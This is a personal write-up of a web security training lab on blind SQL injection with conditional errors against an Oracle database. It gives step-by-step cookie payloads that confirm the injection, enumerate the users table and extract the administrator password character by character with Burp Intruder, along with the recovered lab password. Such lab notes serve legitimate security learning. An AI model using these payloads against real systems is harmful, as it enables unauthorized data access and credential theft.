
### Blind SQL injection with conditional errors : PRACTITIONER

---

> Test that the cookie is vulnerable.
> Try adding `'`, we get an error. This implies that there is a vulnerability.
> Try closing `''`, and it works normally. This is implies there is a vulnerability, but we need to ensure that the SQL code is indeed interpreted.

> Try inputting a query that is correct, so if it works, we know that our SQL statements are interpreted.
```
rA16s0b3PCRhyQB4' AND (SELECT '')='' --
rA16s0b3PCRhyQB4' || (SELECT '') || ' --
```
> This query is correct, but its also causing an error. Might be oracle dbms, so try adding the `FROM DUAL` after the select.
```
rA16s0b3PCRhyQB4' AND (SELECT '' FROM DUAL)='' --
rA16s0b3PCRhyQB4' || (SELECT '' FROM DUAL) || ' --
``` 
> The page responds normally, meaning that it is an oracle dbms, and that our sql code was interpreted.

> We now are sure that it is vulnerable, as both a wrong and correct query where inputted, and they were interpreted. The wrong one was without the `FROM DUAL` clause.

> We now want to check if there is a users table.
```
rA16s0b3PCRhyQB4' AND (SELECT '' FROM users)='' --
rA16s0b3PCRhyQB4' || (SELECT '' FROM users) || ' --
```
> It works. If it hadn't worked, we shouldv'e tried adding `WHERE ROWNUM=1` so as not to break our query if the users table has more than 1 row. 
> Cannot use the `LIMIT 1` syntax as it is not supported by oracle.

> Now we check for the presence of the administrator user.
```
rA16s0b3PCRhyQB4' AND (SELECT username FROM users WHERE username='administrator' )='administrator' --

rA16s0b3PCRhyQB4' || (SELECT username FROM users WHERE username='administrator' )|| ' --
```
> It works, so i tried checking for different usernames and they all worked. So i should try using conditional errors to check for the presence of the administrator.

> For an easier expression, use string concatenation instead of equality checks.
```
rA16s0b3PCRhyQB4' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator') || ' --
```
> This returns an error, meaning that the 'administrator' user exists. To elaborate, try a wrong user, such as `asfas`. The query will work normally, because the FROM part is not correct, and hence the select case portion won't run.
> Our blind injection works through error conditioning. We allow the error condition to happen once something that we desire is true. In our case, we desired the 'administrator' user to exist. If it exists, we trigger an error, signalling us that what we desire occurs.

> Now we need to enumerate the password of the admin user.
```
rA16s0b3PCRhyQB4' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' AND LENGTH(password) > 20) || ' --
```
> Keep trying, or use the BURPSUITE INTRUDER spider tool to change the length until we don't get an error. Again, if we get an error, this means we are on the right path.
> Our password has length of 20, now to enumerate all its characters, use the BURPSUITE INTRUDER clusterbomb tool to change both the index and character.
```
rA16s0b3PCRhyQB4' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' AND SUBSTR(password,1,1) = 'a') || ' --
```

> Let the indices be from 1 to 20.
> Let the characters be from a-z and 0-9

> As [[LAB 12]], conduct the attack and watch for the different response sizes or status codes. See the size corresponding to errors and use those to obtain results. Use status code 500 representing errors to obtain results.

1 - 7
2 - s
3 - s
4 - j
5 - u
6 - 0
7 - m
8 - y
9 - z
10 - 3
11 - h
12 - g
13 - q
14 - x
15 - 1
16 - q
17 - 0
18 - i
19 - l
20 - l

> Assemble password and login to complete lab.
---
